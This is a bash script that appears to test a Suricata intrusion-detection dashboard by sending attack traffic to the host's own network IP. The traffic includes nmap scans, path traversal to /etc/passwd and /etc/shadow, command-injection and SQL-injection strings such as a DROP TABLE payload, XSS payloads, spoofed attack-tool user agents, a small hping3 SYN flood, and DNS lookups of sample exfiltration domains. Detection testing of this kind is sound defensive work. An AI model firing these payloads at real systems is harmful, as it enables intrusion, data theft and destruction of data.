#!/bin/bash

# Get the actual network IP (not localhost) so Suricata can capture traffic
TARGET_IP=$(ip addr show wlp45s0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
if [ -z "$TARGET_IP" ]; then
    echo "ERROR: Could not find IP for wlp45s0 interface"
    echo "Available interfaces:"
    ip addr | grep -E "^[0-9]+:" | awk '{print $2}' | tr -d ':'
    exit 1
fi

echo "=== Advanced Attack Detection Tests ==="
echo "Target IP: $TARGET_IP (network interface traffic will be captured by Suricata)"
echo ""

# Test 1: Nmap SYN Scan (should trigger HIGH alert)
echo "Test 1: Nmap SYN Scan"
echo "Running stealth SYN scan..."
sudo nmap -sS -p 22,80,443 $TARGET_IP 2>&1 | grep -E "(open|filtered)" || echo "Scan completed"
sleep 2

# Test 2: Aggressive Nmap scan with OS detection
echo ""
echo "Test 2: Aggressive Nmap Scan with OS Detection"
echo "Running aggressive scan..."
sudo nmap -A -p 80,443 $TARGET_IP 2>&1 | head -10
sleep 2

# Test 4: Directory traversal attempts
echo ""
echo "Test 4: Directory Traversal Attack"
echo "Attempting path traversal..."
curl -s "http://$TARGET_IP:30081/../../etc/passwd" > /dev/null 2>&1
curl -s "http://$TARGET_IP:30081/api/../../../../etc/shadow" > /dev/null 2>&1
sleep 2

# Test 5: Command injection attempts
echo ""
echo "Test 5: Command Injection Attempts"
echo "Testing command injection patterns..."
curl -s "http://$TARGET_IP:30081/api?cmd=;ls+-la" > /dev/null 2>&1
curl -s "http://$TARGET_IP:30081/api?exec=|cat+/etc/passwd" > /dev/null 2>&1
sleep 2

# Test 6: SQL Injection with various payloads
echo ""
echo "Test 6: SQL Injection Patterns"
echo "Testing SQL injection..."
curl -s "http://$TARGET_IP:30081/api?id=1'+OR+'1'='1" > /dev/null 2>&1
curl -s "http://$TARGET_IP:30081/api?id=1;DROP+TABLE+users--" > /dev/null 2>&1
curl -s "http://$TARGET_IP:30081/api?id=1'+UNION+SELECT+NULL--" > /dev/null 2>&1
sleep 2

# Test 7: XSS attempts
echo ""
echo "Test 7: Cross-Site Scripting (XSS)"
echo "Testing XSS payloads..."
curl -s "http://$TARGET_IP:30081/api?search=<script>alert('XSS')</script>" > /dev/null 2>&1
curl -s "http://$TARGET_IP:30081/api?name=<img+src=x+onerror=alert(1)>" > /dev/null 2>&1
sleep 2

# Test 8: Suspicious user agents
echo ""
echo "Test 8: Malicious User Agents"
echo "Testing with attack tool user agents..."
curl -s -A "sqlmap/1.0" http://$TARGET_IP:30081/ > /dev/null 2>&1
curl -s -A "Metasploit" http://$TARGET_IP:30081/ > /dev/null 2>&1
curl -s -A "Havij" http://$TARGET_IP:30081/ > /dev/null 2>&1
sleep 2

# Test 9: SYN Flood Simulation - CRITICAL for testing our new detection!
echo ""
echo "Test 9: SYN Flood Simulation (Testing 15 SYN packets - should trigger CRITICAL alert after 10)"
echo "Testing rapid SYN packets to port 80..."
if command -v hping3 &> /dev/null; then
    sudo hping3 -S -p 80 -c 15 $TARGET_IP > /dev/null 2>&1
else
    echo "hping3 not installed, using nmap for SYN packets..."
    # Send multiple SYN scans to trigger the detection
    for i in {1..15}; do
        sudo nmap -sS -p 80 $TARGET_IP > /dev/null 2>&1 &
        sleep 0.5
    done
    wait
fi
sleep 3

# Test 10: DNS tunneling attempt
echo ""
echo "Test 10: Suspicious DNS Queries"
echo "Testing DNS exfiltration patterns..."
nslookup "data.exfiltration.malicious.com" 8.8.8.8 > /dev/null 2>&1
nslookup "c2.botnet.example.com" 8.8.8.8 > /dev/null 2>&1
sleep 2

echo ""
echo "=== All Tests Complete ==="
echo ""
echo "Fetching recent alerts..."
curl -sk https://localhost:30081/api/suricata/alerts/recent?limit=20 | jq -r '.[] | "\(.timestamp | split("T")[1] | split(".")[0]) | \(.severity) | \(.signature)"' 2>/dev/null || echo "Could not fetch alerts"

echo ""
echo "Statistics:"
curl -sk https://localhost:30081/api/suricata/statistics/today | jq '{globalTotal, totalAlerts, criticalAlerts, highAlerts, mediumAlerts, lowAlerts}' 2>/dev/null

echo ""
echo "View full dashboard at: https://localhost:30081"
